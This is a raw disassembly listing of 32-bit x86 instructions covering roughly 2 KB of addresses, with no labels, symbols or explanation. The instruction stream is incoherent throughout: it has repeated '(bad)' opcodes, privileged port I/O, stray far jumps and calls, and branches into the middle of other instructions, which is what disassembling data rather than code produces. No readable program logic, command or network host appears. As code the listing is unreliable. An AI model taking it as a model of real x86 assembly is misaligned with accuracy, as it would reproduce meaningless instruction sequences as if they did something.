  41df85:	and    al,BYTE PTR [edi+0x1a750139]
  41df8b:	shl    esp,0x42
  41df8e:	add    BYTE PTR [edi+0x354c17a7],dh
  41df94:	mov    WORD PTR [edi-0x367531ff],ss
  41df9a:	addr16 sub eax,0xf727503b
  41dfa0:	js     0x41df73
  41dfa2:	pop    edx
  41dfa3:	clc    
  41dfa4:	xchg   ecx,esp
  41dfa6:	pop    esp
  41dfa7:	call   0x4d2bf803
  41dfac:	inc    edi
  41dfad:	loop   0x41df5b
  41dfaf:	jne    0x41e013
  41dfb1:	jbe    0x41df70
  41dfb3:	jp     0x41dfc0
  41dfb5:	pop    edx
  41dfb6:	out    0x54,al
  41dfb8:	xchg   BYTE PTR [ebx-0xa746102],al
  41dfbe:	inc    eax
  41dfbf:	jo     0x41df82
  41dfc1:	push   ebp
  41dfc2:	test   DWORD PTR [edi],ebp
  41dfc4:	dec    ebp
  41dfc5:	sub    BYTE PTR [edi+0x1f],cl
  41dfc8:	cmp    al,0x2a
  41dfca:	xor    BYTE PTR [ebp+0x55],dl
  41dfcd:	mov    WORD PTR [edx],es
  41dfcf:	add    eax,esp
  41dfd1:	add    DWORD PTR [eax-0x73307840],eax
  41dfd7:	fst    DWORD PTR [ebp+0x311606c1]
  41dfdd:	add    bh,BYTE PTR [edx]
  41dfdf:	mov    eax,ds:0x38d928a4
  41dfe4:	jo     0x41e04c
  41dfe6:	retf   
  41dfe7:	mov    BYTE PTR [esi],dl
  41dfe9:	lods   al,BYTE PTR ds:[esi]
  41dfea:	rcr    edx,0x23
  41dfed:	fcomi  st,st(2)
  41dfef:	mov    ds,WORD PTR [eax]
  41dff1:	mov    eax,0x3c4057b6
  41dff6:	dec    edx
  41dff7:	pop    ecx
  41dff8:	xchg   esi,eax
  41dff9:	or     eax,0x6dfd47d0
  41dffe:	push   eax
  41dfff:	in     eax,0x42
  41e001:	mov    dl,0x77
  41e003:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e004:	xor    esp,DWORD PTR [edi-0x58bf0045]
  41e00a:	push   es
  41e00b:	jg     0x41dff9
  41e00d:	inc    ebx
  41e00e:	push   eax
  41e00f:	shr    BYTE PTR [edi+0x2748edb6],0xb6
  41e016:	xchg   esi,eax
  41e017:	ret    
  41e018:	xchg   BYTE PTR [esi],dh
  41e01a:	test   DWORD PTR es:[ebx-0x2],0xb37391a0
  41e022:	fsub   DWORD PTR [edi]
  41e024:	or     esi,esi
  41e026:	jne    0x41dfed
  41e028:	adc    BYTE PTR [ebp-0x4b],0x66
  41e02c:	push   ebp
  41e02d:	inc    edi
  41e02e:	dec    ebp
  41e02f:	mov    al,ds:0x165dbed0
  41e034:	ds sbb al,0x2
  41e037:	mov    dh,0x60
  41e039:	je     0x41e065
  41e03b:	xor    al,0x83
  41e03d:	xlat   BYTE PTR ds:[ebx]
  41e03e:	xchg   BYTE PTR [edi+edx*2-0x70f2ab53],ah
  41e045:	inc    edi
  41e046:	ret    
  41e047:	xlat   BYTE PTR ds:[ebx]
  41e048:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e049:	or     esp,DWORD PTR [ebx+0xc]
  41e04c:	jbe    0x41e027
  41e04e:	fisub  DWORD PTR [ebx+0x2a]
  41e051:	jge    0x41e028
  41e053:	sbb    al,0x4e
  41e055:	scas   eax,DWORD PTR es:[edi]
  41e056:	adc    BYTE PTR [edx-0x40232c39],0xb7
  41e05d:	sbb    eax,DWORD PTR [esi+0x1f973b]
  41e063:	add    al,0xa8
  41e065:	ins    DWORD PTR es:[edi],dx
  41e066:	pop    ebx
  41e067:	dec    edi
  41e068:	ret    0x24c5
  41e06b:	xchg   ebp,eax
  41e06c:	fst    QWORD PTR [ebx+edi*8+0x38da1b86]
  41e073:	pop    ds
  41e074:	mov    ah,0xf1
  41e076:	sub    BYTE PTR [ebp-0x5f],0x80
  41e07a:	arpl   WORD PTR [ecx+edx*8-0x7ef3a9f6],bp
  41e081:	and    al,0x44
  41e083:	and    ebp,DWORD PTR [ebx]
  41e085:	jbe    0x41e092
  41e087:	aaa    
  41e088:	jnp    0x41e06a
  41e08a:	scas   eax,DWORD PTR es:[edi]
  41e08b:	into   
  41e08c:	fstp   QWORD PTR [esi-0x18]
  41e08f:	or     DWORD PTR [ebx+0x76515acf],0xffffffac
  41e096:	data16 and BYTE PTR [eax],bh
  41e099:	pop    ds
  41e09a:	mov    ah,0xc4
  41e09c:	push   0xffffff8b
  41e09e:	data16 or al,0xfa
  41e0a1:	jmp    0x24d5:0xa05fd7da
  41e0a8:	das    
  41e0a9:	imul   esi,esp,0xffffffda
  41e0ac:	ja     0x41e037
  41e0ae:	or     edx,edi
  41e0b0:	jl     0x41e0b4
  41e0b2:	mov    al,ds:0x7a4506bb
  41e0b7:	sub    esp,DWORD PTR [ebp-0x68]
  41e0ba:	gs test al,0xf1
  41e0bd:	aas    
  41e0be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e0bf:	out    0x3f,al
  41e0c1:	setns  BYTE PTR [ebp-0x5dd589fb]
  41e0c8:	mov    eax,ds:0x173b51e5
  41e0cd:	fadd   QWORD PTR [esi-0x1b]
  41e0d0:	adc    al,0xe6
  41e0d2:	mov    eax,0xd9b4de02
  41e0d7:	in     eax,dx
  41e0d8:	stc    
  41e0d9:	pushf  
  41e0da:	push   DWORD PTR [edx-0xb]
  41e0dd:	adc    esi,DWORD PTR ds:0x42181c28
  41e0e3:	sti    
  41e0e4:	mov    cl,0x18
  41e0e6:	mov    eax,0x48800ddf
  41e0eb:	orps   xmm5,XMMWORD PTR [eax]
  41e0ee:	mov    DWORD PTR [eax-0x16],ecx
  41e0f1:	or     bl,ah
  41e0f3:	pop    esp
  41e0f4:	aas    
  41e0f5:	icebp  
  41e0f6:	push   0x23
  41e0f8:	push   esp
  41e0f9:	cwde   
  41e0fa:	hlt    
  41e0fb:	fisttp WORD PTR [ebx+0x3194a080]
  41e101:	add    al,BYTE PTR [edx+edi*8-0x51]
  41e105:	push   ds
  41e106:	in     al,dx
  41e107:	lock sub ah,BYTE PTR [ebx-0x37]
  41e10b:	retf   
  41e10c:	dec    esi
  41e10d:	retf   
  41e10e:	enter  0x9c0c,0x56
  41e112:	retf   0xdd77
  41e115:	cli    
  41e116:	sub    DWORD PTR [eax+0x5c],0xffffffc0
  41e11a:	ins    BYTE PTR es:[edi],dx
  41e11b:	std    
  41e11c:	pop    ds
  41e11d:	xlat   BYTE PTR ds:[ebx]
  41e11e:	pop    es
  41e11f:	aad    0x95
  41e121:	xor    al,0xf9
  41e123:	retf   0x2edb
  41e126:	mov    ds:0x6493fb50,al
  41e12b:	fmul   QWORD PTR [ecx+0x5f]
  41e12e:	pop    ecx
  41e12f:	xchg   esp,eax
  41e130:	mov    ah,0xd5
  41e132:	dec    esp
  41e133:	xor    eax,0x1aa60b72
  41e138:	stc    
  41e139:	jp     0x41e198
  41e13b:	and    DWORD PTR [ebp+0x409d10dd],edx
  41e141:	cmp    cl,BYTE PTR [esi]
  41e143:	mov    bh,bh
  41e145:	or     al,0xeb
  41e147:	jo     0x41e1ad
  41e149:	sub    ah,bh
  41e14b:	cmp    al,0xd2
  41e14d:	bound  ecx,QWORD PTR [eax+0x78]
  41e150:	mov    edi,0x3e12cbdb
  41e156:	lods   al,BYTE PTR ds:[esi]
  41e157:	test   DWORD PTR [edx+0x2f8d1ba3],eax
  41e15d:	inc    edi
  41e15e:	jb     0x41e10a
  41e160:	(bad)  
  41e161:	or     DWORD PTR [edi+eiz*1-0x7eaf342],esp
  41e168:	setle  BYTE PTR [ebp-0x15b80000]
  41e16f:	pop    edx
  41e170:	or     BYTE PTR [ecx],0x7e
  41e173:	adc    cl,BYTE PTR [ebp-0x6e]
  41e176:	and    dh,BYTE PTR [eax-0x55f3d5ff]
  41e17c:	clc    
  41e17d:	mov    ecx,0xce7c520f
  41e182:	xor    DWORD PTR [edi+0x13],edx
  41e185:	ret    
  41e186:	adc    BYTE PTR ds:0xb6f6699f,dl
  41e18c:	adc    al,0x7
  41e18e:	sbb    DWORD PTR [esp+eax*1-0x2b86988a],ebp
  41e195:	retf   0x3d4
  41e198:	and    BYTE PTR [ebx+ebx*8],ah
  41e19b:	mov    ecx,0x19f764b9
  41e1a0:	in     eax,0x43
  41e1a2:	data16 addr16 fadd st,st(6)
  41e1a6:	sub    dl,cl
  41e1a8:	xor    BYTE PTR [edx+0x6f3817ed],0xa2
  41e1af:	push   0x3d7d5c84
  41e1b4:	mov    cl,0x9f
  41e1b6:	and    ecx,ecx
  41e1b8:	mov    ebx,0xa7d97724
  41e1bd:	or     edi,edi
  41e1bf:	bound  ebx,QWORD PTR [esi-0x7b]
  41e1c2:	adc    dh,BYTE PTR [edx-0x77]
  41e1c5:	std    
  41e1c6:	adc    BYTE PTR [edi],bl
  41e1c8:	jecxz  0x41e1ab
  41e1ca:	clc    
  41e1cb:	sub    ah,BYTE PTR ds:0x2917053b
  41e1d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e1d2:	sub    BYTE PTR [esi-0x52a8fda1],ch
  41e1d8:	sub    bl,BYTE PTR [ebx-0x73]
  41e1db:	addr16 jg 0x41e18d
  41e1de:	je     0x41e183
  41e1e0:	lahf   
  41e1e1:	test   eax,0xa1635663
  41e1e6:	fdivr  st(6),st
  41e1e8:	ror    DWORD PTR [ebp+0x13],0x62
  41e1ec:	inc    eax
  41e1ed:	inc    esi
  41e1ee:	sbb    ebx,DWORD PTR [ebx+0x18c39147]
  41e1f4:	push   edx
  41e1f5:	fist   WORD PTR [ecx]
  41e1f7:	lds    ebp,FWORD PTR [edx-0x32]
  41e1fa:	mov    al,ds:0x63a8250c
  41e1ff:	and    DWORD PTR [esi],0xb1033d6c
  41e205:	xchg   BYTE PTR [edi],al
  41e207:	mov    cl,0xf9
  41e209:	sahf   
  41e20a:	xchg   esi,eax
  41e20b:	mov    al,ds:0x9fae3f04
  41e210:	dec    ebp
  41e211:	pop    es
  41e212:	mov    dh,0x52
  41e214:	cs lahf 
  41e216:	(bad)  
  41e217:	lock aad 0xa9
  41e21a:	inc    ebx
  41e21b:	adc    BYTE PTR [esi],al
  41e21d:	frstor [ecx+0x60]
  41e220:	lds    esi,FWORD PTR [eax-0x75c6b6a0]
  41e226:	or     BYTE PTR [edx-0x74d89793],bh
  41e22c:	lds    ebx,FWORD PTR [eax-0x4a]
  41e22f:	pusha  
  41e230:	in     eax,0xe2
  41e232:	jne    0x41e23b
  41e234:	push   edi
  41e235:	jg     0x41e1bc
  41e237:	(bad)  [edi+0x1b]
  41e23a:	xchg   edx,eax
  41e23b:	scas   eax,DWORD PTR es:[edi]
  41e23c:	leave  
  41e23d:	(bad)  
  41e23f:	arpl   WORD PTR [edx+0x38],bx
  41e242:	pop    es
  41e243:	add    edx,DWORD PTR [edx-0x4a]
  41e246:	repnz sbb DWORD PTR [ecx],esi
  41e249:	sahf   
  41e24a:	out    0xc5,al
  41e24c:	adc    eax,0xe2568a29
  41e251:	mov    ds:0x780512ee,al
  41e256:	in     al,0x70
  41e258:	xchg   BYTE PTR [esi],ah
  41e25a:	rol    BYTE PTR [edi+0x6770dd63],0x32
  41e261:	icebp  
  41e262:	mov    eax,0x4b6ab5bc
  41e267:	addr16 ja 0x41e2a9
  41e26a:	je     0x41e2bd
  41e26c:	push   eax
  41e26d:	mov    dl,ah
  41e26f:	sub    ah,BYTE PTR [ecx-0x64]
  41e272:	mov    WORD PTR [eax-0x76dd3f03],fs
  41e278:	dec    esp
  41e279:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e27a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e27b:	xchg   ebp,eax
  41e27c:	inc    ebp
  41e27d:	jecxz  0x41e238
  41e27f:	into   
  41e280:	in     al,0x34
  41e282:	xchg   DWORD PTR [eax],ebp
  41e284:	mov    ah,0x85
  41e286:	out    0xc5,eax
  41e288:	and    DWORD PTR [ebx],ecx
  41e28a:	mov    ebp,0xe52c12ff
  41e28f:	test   eax,0x1f4d4214
  41e294:	jmp    0x41e2d5
  41e296:	push   esi
  41e297:	mov    ds:0x24199a92,eax
  41e29c:	xor    DWORD PTR [ebx+0x6d48d759],edi
  41e2a2:	or     cl,cl
  41e2a4:	xor    DWORD PTR [eax-0x80],eax
  41e2a7:	mov    esi,0xe1c2de87
  41e2ac:	in     eax,dx
  41e2ad:	sar    BYTE PTR [edi],1
  41e2af:	dec    esi
  41e2b0:	sar    BYTE PTR [esi],0xf8
  41e2b3:	sub    ah,BYTE PTR [esi+0x1d]
  41e2b6:	push   0x9797ad01
  41e2bb:	xchg   edx,eax
  41e2bc:	pop    ebp
  41e2bd:	hlt    
  41e2be:	cs pop es
  41e2c0:	inc    eax
  41e2c1:	push   ds
  41e2c2:	jb     0x41e263
  41e2c4:	test   al,0xf3
  41e2c6:	test   BYTE PTR [eax+0x3a],dl
  41e2c9:	sbb    ah,BYTE PTR [ecx-0x3175f8b7]
  41e2cf:	ds pushf 
  41e2d1:	pusha  
  41e2d2:	adc    eax,0x71fbed3d
  41e2d7:	into   
  41e2d8:	mov    eax,0x52c686c5
  41e2dd:	add    eax,0xa16c6c53
  41e2e2:	mov    dl,BYTE PTR [ebx+0x44]
  41e2e5:	fwait
  41e2e6:	or     DWORD PTR [ebx+0x7f],ecx
  41e2e9:	dec    eax
  41e2ea:	mov    dh,0x88
  41e2ec:	and    bl,BYTE PTR [edx+0xecfc013]
  41e2f2:	mov    eax,0x14c38c3
  41e2f7:	data16 sbb ch,cl
  41e2fa:	mov    cl,0x3
  41e2fc:	leave  
  41e2fd:	push   eax
  41e2fe:	ja     0x41e2c4
  41e300:	add    eax,0x7e53c072
  41e305:	and    edx,0x78d49cbb
  41e30b:	aam    0x9e
  41e30d:	adc    al,0xb1
  41e30f:	frstor [ebp+0x32]
  41e312:	loope  0x41e2c3
  41e314:	jle    0x41e2a0
  41e316:	push   0x55
  41e318:	shl    DWORD PTR [eax-0x7a],0x16
  41e31c:	pop    ss
  41e31d:	outs   dx,DWORD PTR ds:[esi]
  41e31e:	jae    0x41e2fc
  41e320:	ret    
  41e321:	fdiv   DWORD PTR [edi-0x2e044a8e]
  41e327:	sub    eax,0xb1827be1
  41e32c:	enter  0xb15b,0xf0
  41e330:	sahf   
  41e331:	arpl   WORD PTR [ecx],di
  41e333:	fisub  WORD PTR [esp+eax*4]
  41e336:	and    DWORD PTR [edi-0x5094504d],0x379e91b5
  41e340:	pushf  
  41e341:	(bad)  
  41e342:	int3   
  41e343:	mov    cl,0x40
  41e345:	xchg   ecx,eax
  41e346:	jp     0x41e3a5
  41e348:	xor    DWORD PTR [eax],ebx
  41e34a:	rcr    al,0x99
  41e34d:	rcl    DWORD PTR [ebp-0x63],0xd0
  41e351:	xor    al,0x9c
  41e353:	jge    0x41e3a6
  41e355:	jmp    0xa80ec2de
  41e35a:	jne    0x41e364
  41e35c:	or     dh,dh
  41e35e:	aam    0xa5
  41e360:	mov    dl,0x3f
  41e362:	sbb    al,0xd0
  41e364:	dec    ebp
  41e365:	mov    edx,0x52217fe4
  41e36a:	mov    al,ds:0x8341c0dd
  41e36f:	or     BYTE PTR [ebp-0x3c61cc34],ah
  41e375:	jp     0x41e388
  41e377:	sub    ebx,edx
  41e379:	in     al,0xde
  41e37b:	ret    0x6faf
  41e37e:	jge    0x41e334
  41e380:	dec    ebp
  41e381:	sub    DWORD PTR [edx+ebp*4],esi
  41e384:	mov    ebp,fs
  41e386:	jmp    0x2ce233a
  41e38b:	gs pop ebx
  41e38d:	rcr    eax,0xd1
  41e390:	push   esp
  41e391:	add    al,0x1
  41e393:	(bad)  [ecx+0x7eb48df3]
  41e399:	jp     0x41e3d6
  41e39b:	imul   eax,DWORD PTR [ecx+0x1],0xb555a876
  41e3a2:	add    eax,0xf63116a9
  41e3a7:	sbb    BYTE PTR [ebp-0x6a],ch
  41e3aa:	loope  0x41e33f
  41e3ac:	mov    esp,0x16ca8a95
  41e3b1:	adc    BYTE PTR [esi],0x6b
  41e3b4:	pcmpeqw mm0,mm1
  41e3b7:	add    bl,BYTE PTR [ebx]
  41e3b9:	leave  
  41e3ba:	hlt    
  41e3bb:	sub    al,0xda
  41e3bd:	test   DWORD PTR [ecx+0x3e],eax
  41e3c0:	jnp    0x41e415
  41e3c2:	fst    DWORD PTR [ebx-0x4e]
  41e3c5:	mov    ds,WORD PTR [ecx+0x4194e0eb]
  41e3cb:	imul   edi,ebx,0xd245ad45
  41e3d1:	js     0x41e3c7
  41e3d3:	xchg   DWORD PTR [ebx+0x67f5b339],ebx
  41e3d9:	push   es
  41e3da:	or     al,0x4a
  41e3dc:	xchg   ecx,ebp
  41e3de:	mov    WORD PTR [ecx-0x1e],?
  41e3e1:	mov    edi,0x15c3381a
  41e3e6:	adc    DWORD PTR [edi-0x3c],esp
  41e3e9:	sub    al,0x6
  41e3eb:	int    0xf
  41e3ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e3ee:	shr    BYTE PTR [eax],1
  41e3f0:	mov    ds,edi
  41e3f2:	sub    cl,BYTE PTR [esi+0x4c]
  41e3f5:	repz sbb al,0x58
  41e3f8:	push   esi
  41e3f9:	mov    eax,0xf3de0edc
  41e3fe:	mov    WORD PTR [edx+ebp*2+0x4af8c53a],fs
  41e405:	sub    dh,BYTE PTR [edi+0x18]
  41e408:	sub    ecx,ecx
  41e40a:	lds    edi,FWORD PTR [ebp-0x64502ac8]
  41e410:	fild   WORD PTR [ecx+0x7e]
  41e413:	jno    0x41e457
  41e415:	repnz cmp ah,BYTE PTR [edx-0x619bc8a9]
  41e41c:	stos   DWORD PTR es:[edi],eax
  41e41d:	add    DWORD PTR [ebx-0x4a00186e],0x6acd6d3b
  41e427:	mov    ds:0xb818f2da,eax
  41e42c:	das    
  41e42d:	jbe    0x41e420
  41e42f:	imul   ecx,DWORD PTR [eax-0x4d3a4e14],0x9ccb94cb
  41e439:	adc    esi,eax
  41e43b:	inc    esi
  41e43c:	mov    ch,0x47
  41e43e:	rol    cl,cl
  41e440:	in     al,dx
  41e441:	mov    esp,0x84137c34
  41e446:	xor    edx,DWORD PTR [edx]
  41e448:	jae    0x41e494
  41e44a:	add    edi,eax
  41e44c:	mov    ss,WORD PTR ds:0x7c03595c
  41e452:	push   ecx
  41e453:	stos   DWORD PTR es:[edi],eax
  41e454:	inc    BYTE PTR [eax+0x55]
  41e457:	dec    eax
  41e458:	and    BYTE PTR [edx+0x38],bl
  41e45b:	je     0x41e4ca
  41e45d:	sub    al,0x37
  41e45f:	sbb    DWORD PTR [eax-0x38c2ad66],ebx
  41e465:	jecxz  0x41e451
  41e467:	push   ebp
  41e468:	pop    ebp
  41e469:	arpl   bx,ax
  41e46b:	stos   BYTE PTR es:[edi],al
  41e46c:	jno    0x41e425
  41e46e:	xchg   ecx,eax
  41e46f:	cmp    eax,0x3e8ec89a
  41e474:	and    al,0x1a
  41e476:	dec    ebx
  41e477:	cs fcmovb st,st(3)
  41e47a:	retf   
  41e47b:	fcomp  QWORD PTR [eax]
  41e47d:	add    edx,DWORD PTR [esi+eax*4+0x4a]
  41e481:	aas    
  41e482:	aaa    
  41e483:	ins    BYTE PTR es:[edi],dx
  41e484:	std    
  41e485:	jbe    0x41e4b2
  41e487:	stos   DWORD PTR es:[edi],eax
  41e488:	jb     0x41e48a
  41e48a:	mov    ds,WORD PTR [edi-0xb]
  41e48d:	mov    al,dl
  41e48f:	mov    al,ds:0xbbab1269
  41e494:	fadd   QWORD PTR [edi-0x5634196d]
  41e49a:	sbb    ebp,DWORD PTR [esi]
  41e49c:	shl    DWORD PTR [eax-0x7e],0x95
  41e4a0:	jno    0x41e456
  41e4a2:	ja     0x41e440
  41e4a4:	push   0x78
  41e4a6:	adc    ebx,DWORD PTR [edi+0x29]
  41e4a9:	fimul  DWORD PTR [esi-0x1e14cc4f]
  41e4b0:	mov    esp,0x33e1412c
  41e4b5:	call   0x2732:0xf6c967c5
  41e4bc:	aas    
  41e4bd:	or     bl,BYTE PTR [ebx-0x4c315419]
  41e4c3:	retf   0x4e1a
  41e4c6:	sub    DWORD PTR [ebx],edx
  41e4c8:	xchg   edx,eax
  41e4c9:	lds    esi,FWORD PTR [ebp+0xfd981b0]
  41e4cf:	dec    ebp
  41e4d0:	push   edi
  41e4d1:	push   0x56
  41e4d3:	imul   eax,DWORD PTR [ecx+0x5752612f],0x96254b3
  41e4dd:	push   esi
  41e4de:	lea    edi,[esi*8-0x1d5cb081]
  41e4e5:	push   esi
  41e4e6:	not    DWORD PTR [edi+0x73]
  41e4e9:	cmp    al,0xc5
  41e4eb:	cdq    
  41e4ec:	stc    
  41e4ed:	mov    ds:0x2d462a76,eax
  41e4f2:	jg     0x41e4af
  41e4f4:	dec    esp
  41e4f5:	sub    BYTE PTR [esi+0x791aa55b],0x19
  41e4fc:	jecxz  0x41e541
  41e4fe:	jecxz  0x41e553
  41e500:	rcr    cl,0xab
  41e503:	pop    edx
  41e504:	mov    ebp,DWORD PTR [edx-0x7e]
  41e507:	dec    esi
  41e508:	inc    ebx
  41e509:	pop    ecx
  41e50a:	neg    BYTE PTR [ecx-0x32]
  41e50d:	loope  0x41e4b3
  41e50f:	jge    0x41e4b0
  41e511:	lea    edi,[esi+esi*4+0x76814170]
  41e518:	je     0x41e4ec
  41e51a:	xchg   ebp,eax
  41e51b:	push   esp
  41e51c:	jle    0x41e4f6
  41e51e:	je     0x41e589
  41e520:	clc    
  41e521:	and    al,0xf6
  41e523:	pop    ebx
  41e524:	jecxz  0x41e54b
  41e526:	xor    eax,0x36cac10a
  41e52b:	dec    edi
  41e52d:	les    edi,FWORD PTR [ecx-0x35]
  41e530:	and    al,0xd9
  41e532:	mov    edi,0xa4590e3c
  41e537:	lock repnz xor ah,BYTE PTR gs:[esi+0x7f0e525]
  41e540:	or     eax,0x230e2453
  41e545:	pop    ebx
  41e546:	and    BYTE PTR [ebp+0xb],ah
  41e549:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e54a:	xor    al,0x99
  41e54c:	adc    ecx,DWORD PTR [eax]
  41e54e:	or     edx,DWORD PTR [ebp+0x14113fec]
  41e554:	pusha  
  41e555:	dec    esi
  41e556:	dec    ebp
  41e557:	imul   esp,DWORD PTR [edx-0x7751fa10],0x1e3a94c1
  41e561:	repz xchg ecx,eax
  41e563:	arpl   cx,bp
  41e565:	xchg   BYTE PTR [eax-0x63869536],dl
  41e56b:	pop    ebx
  41e56c:	push   ebx
  41e56d:	adc    eax,esi
  41e56f:	(bad)  
  41e570:	cli    
  41e571:	int3   
  41e572:	or     bh,BYTE PTR [eax]
  41e574:	pop    esp
  41e575:	jmp    0x41e5ac
  41e577:	mov    ds:0x9336b1d6,eax
  41e57c:	dec    ebx
  41e57d:	imul   edx,DWORD PTR [esi+0x51],0x43581a43
  41e584:	add    DWORD PTR [edx],eax
  41e586:	shr    esi,cl
  41e588:	dec    ebx
  41e589:	sub    ecx,ebx
  41e58b:	dec    esp
  41e58c:	dec    ebp
  41e58d:	push   edi
  41e58e:	aas    
  41e58f:	repz aas 
  41e591:	sti    
  41e592:	cmp    ch,BYTE PTR [edi+0x298e6a47]
  41e598:	jg     0x41e550
  41e59a:	out    dx,eax
  41e59b:	rol    BYTE PTR [ebp+0x4631b48e],1
  41e5a1:	sbb    al,0x4c
  41e5a3:	xchg   edx,eax
  41e5a4:	fld    st(3)
  41e5a6:	or     ch,BYTE PTR [esi+0x66]
  41e5a9:	sub    BYTE PTR [eax],dh
  41e5ab:	sahf   
  41e5ac:	dec    ecx
  41e5ad:	outs   dx,DWORD PTR ds:[esi]
  41e5ae:	dec    eax
  41e5af:	pushf  
  41e5b0:	out    0xa5,al
  41e5b2:	and    edx,DWORD PTR [edx]
  41e5b4:	out    dx,eax
  41e5b5:	cli    
  41e5b6:	aad    0xbb
  41e5b8:	or     BYTE PTR [ecx],dl
  41e5ba:	xor    BYTE PTR [esi],cl
  41e5bc:	cli    
  41e5bd:	push   cs
  41e5be:	lock xlat BYTE PTR ds:[ebx]
  41e5c0:	mov    edi,0xd9022af9
  41e5c5:	sbb    esi,DWORD PTR [esi-0x1b0ed1f9]
  41e5cb:	call   0xfb3:0x5cd70f06
  41e5d2:	fs cdq 
  41e5d4:	push   esp
  41e5d5:	or     BYTE PTR [edi],cl
  41e5d7:	xlat   BYTE PTR ds:[ebx]
  41e5d8:	mov    al,0xe4
  41e5da:	pushf  
  41e5db:	sub    esp,DWORD PTR [ebx-0x68ab0cf3]
  41e5e1:	sbb    eax,0xec745d6
  41e5e6:	(bad)  [ebp-0x57]
  41e5e9:	sub    eax,0x413f698a
  41e5ee:	mov    ebp,0xb1cff4b3
  41e5f3:	or     eax,DWORD PTR [ecx]
  41e5f5:	jmp    0x950c69a
  41e5fa:	sbb    eax,0x77e5e52e
  41e5ff:	mov    ebx,0xce33fcc7
  41e604:	adc    ecx,0xfffffff3
  41e607:	pop    edx
  41e608:	addr16 cld 
  41e60a:	mov    edi,0x51502790
  41e60f:	(bad)  
  41e610:	mov    bh,0x95
  41e612:	loop   0x41e5d7
  41e614:	gs jmp 0xc0a7:0x3fa79acb
  41e61c:	and    eax,0x75441056
  41e621:	push   edi
  41e622:	pop    ebx
  41e623:	push   edx
  41e624:	xchg   edi,eax
  41e625:	cwde   
  41e626:	cmp    BYTE PTR [eax-0x1681ee6],dh
  41e62c:	jmp    0xa62254be
  41e631:	fiadd  WORD PTR [edi-0x34889c9]
  41e637:	fnsave [eax+0x52]
  41e63a:	sbb    DWORD PTR [esi+0x5b410232],edi
  41e640:	mov    esp,0x8a316e30
  41e645:	push   0x1c
  41e647:	aad    0xbf
  41e649:	sbb    al,0x47
  41e64b:	adc    al,0xdb
  41e64d:	jnp    0x41e693
  41e64f:	push   0x58
  41e651:	jo     0x41e6c0
  41e653:	iret   
  41e654:	and    DWORD PTR [ecx-0x7d45b1d5],esi
  41e65a:	and    edi,DWORD PTR [edx-0x74a5bee4]
  41e660:	cmp    al,0x46
  41e662:	sub    BYTE PTR [ebx],al
  41e664:	fild   WORD PTR [ebx]
  41e666:	popf   
  41e667:	std    
  41e668:	inc    ebp
  41e669:	fnstenv [ecx-0x2ccacc03]
  41e66f:	(bad)  
  41e670:	call   0x3856:0x9d9083aa
  41e677:	jmp    0x6b3:0x651f32bd
  41e67e:	or     al,0x97
  41e680:	cli    
  41e681:	push   ebx
  41e682:	adc    BYTE PTR [ebp-0x6d],bl
  41e685:	stos   DWORD PTR es:[edi],eax
  41e686:	and    BYTE PTR [esi],ch
  41e688:	icebp  
  41e689:	jp     0x41e662
  41e68b:	int3   
  41e68c:	das    
  41e68d:	out    dx,al
  41e68e:	or     BYTE PTR [edx-0xa],cl
  41e691:	ds pop esi
  41e693:	sub    dl,BYTE PTR ds:0x4a33a3d9
  41e699:	and    ebp,ebp
  41e69b:	jge    0x41e62c
  41e69d:	jmp    0xe2f2:0x49ccd774
  41e6a4:	jbe    0x41e6aa
  41e6a6:	mov    eax,0x5f561b79
  41e6ab:	sub    al,bh
  41e6ad:	or     esi,DWORD PTR [ebx-0x5feae058]
  41e6b3:	inc    ebp
  41e6b4:	pop    ecx
  41e6b5:	pop    ecx
  41e6b6:	sub    al,0x4f
  41e6b8:	push   eax
  41e6b9:	jl     0x41e6c5
  41e6bb:	inc    edx
  41e6bc:	mov    ah,0xc5
  41e6be:	jbe    0x41e648
  41e6c0:	leave  
  41e6c1:	push   ecx
  41e6c2:	or     bh,al
  41e6c4:	mov    bl,0x69
  41e6c6:	test   DWORD PTR [ecx],esi
  41e6c8:	ret    0x4e12
  41e6cb:	sub    BYTE PTR [edx],0x5
  41e6ce:	aam    0x36
  41e6d0:	mov    dl,0x14
  41e6d2:	push   cs
  41e6d3:	pop    ebx
  41e6d4:	aad    0xd6
  41e6d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e6d7:	daa    
  41e6d8:	xchg   BYTE PTR [eax+0x703e5a5f],dh
  41e6de:	in     al,0x43
  41e6e0:	fild   QWORD PTR [ebp-0x1f0b0e6c]
  41e6e6:	retf   0xddf
  41e6e9:	add    eax,0xe1246d0a
  41e6ee:	adc    ah,dh
  41e6f0:	inc    esi
  41e6f1:	retf   0xed07
  41e6f4:	lock jae 0x41e677
  41e6f7:	out    dx,eax
  41e6f8:	mov    bh,0x70
  41e6fa:	ins    DWORD PTR es:[edi],dx
  41e6fb:	sbb    BYTE PTR [edx+0xa97d79],al
  41e701:	jns    0x41e6e3
  41e703:	xchg   BYTE PTR [edx-0x18bdb51a],bl
  41e709:	add    al,0xa3
  41e70b:	ins    BYTE PTR es:[edi],dx
  41e70c:	mov    esp,cs
  41e70e:	and    BYTE PTR [ecx+ebx*2+0x18],bh
  41e712:	inc    ebp
  41e713:	or     eax,0x61f0a7f5
  41e718:	adc    al,0x79
  41e71a:	xchg   edi,eax
  41e71b:	mov    bl,0x52
  41e71d:	scas   eax,DWORD PTR es:[edi]
  41e71e:	adc    BYTE PTR [esi+0x33],dh
  41e721:	call   0xcea15144
  41e726:	jge    0x41e795
  41e728:	daa    
  41e729:	call   ebx
  41e72b:	push   esi
  41e72c:	mov    ah,0x81
  41e72e:	sti    
  41e72f:	mov    eax,ds:0x37390462
  41e734:	(bad)  
  41e735:	mov    cs,WORD PTR [ebx]
  41e737:	jmp    0x2a98:0xd5ac4818
  41e73e:	popa   
  41e73f:	and    al,0xcb
  41e741:	ds aad 0x33
  41e744:	xchg   ecx,eax
  41e745:	inc    ecx
  41e746:	pop    ecx
  41e747:	cmp    BYTE PTR [ebp-0x159f8758],dh
  41e74d:	repz mov ebx,DWORD PTR [edx+eiz*8+0x2e4b2326]
